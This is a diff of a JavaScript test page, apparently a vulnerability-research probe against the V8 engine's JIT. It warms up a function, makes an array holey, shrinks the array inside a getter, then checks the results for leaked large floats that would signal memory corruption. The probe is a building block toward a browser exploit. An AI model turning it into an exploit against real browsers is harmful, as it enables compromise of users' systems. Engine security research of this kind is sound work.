@@ -12,7 +12,7 @@ function vuln(a, i) {
 }
 
 // =======================
-// WARMUP (JIT expects double elements)
+// WARMUP (force JIT double path)
 // =======================
 let arr = [1.1, 2.2, 3.3, 4.4];
 
@@ -21,46 +21,52 @@ for (let i = 0; i < 100000; i++) {
 }
 
 // =======================
-// BREAK ASSUMPTIONS
+// BREAK ASSUMPTIONS (numeric edge cases)
 // =======================
 
-// Step 1: make holey
-delete arr[0];
+// ubah jadi HOLEY_DOUBLE
+delete arr[1];
 
-// Step 2: change type
-arr[0] = { valueOf() { return 13.37; } };
+// isi dengan NaN (edge case penting di V8)
+arr[1] = NaN;
 
-// Step 3: side-effect that changes length deterministically
-Object.defineProperty(arr, 1, {
+// getter yang ubah struktur (tanpa string coercion)
+Object.defineProperty(arr, 2, {
     get() {
-        arr.length = 1;
-        return 2.2;
+        arr.length = 0;   // drastic change
+        return 3.3;
     }
 });
 
 // =======================
 // TRIGGER
 // =======================
-let r1 = vuln(arr, 0);
-let r2 = vuln(arr, 1);
+let r1 = vuln(arr, 1);
+let r2 = vuln(arr, 2);
 
 log("r1 = " + r1);
 log("r2 = " + r2);
 
 // =======================
-// CHECKS (VALID SIGNAL ONLY)
+// SIGNAL CHECK (real indicators)
 // =======================
 
 // harus number
 if (typeof r1 !== "number" || typeof r2 !== "number") {
-    log("❗ unexpected type (possible confusion)");
+    log("❗ TYPE MISMATCH");
 }
 
-// cari nilai aneh (bukan coercion string)
-if (Number.isFinite(r1) && Math.abs(r1) > 1e10) {
-    log("❗ suspicious large float: " + r1);
+// cari float aneh (indikasi memory issue)
+function suspicious(v) {
+    return Number.isFinite(v) && Math.abs(v) > 1e10;
 }
-if (Number.isFinite(r2) && Math.abs(r2) > 1e10) {
-    log("❗ suspicious large float: " + r2);
+
+if (suspicious(r1)) log("❗ suspicious r1: " + r1);
+if (suspicious(r2)) log("❗ suspicious r2: " + r2);
+
+// check konsistensi
+let repeat = vuln(arr, 1);
+if (repeat !== r1) {
+    log("❗ NON-DETERMINISTIC RESULT");
 }
 </script>
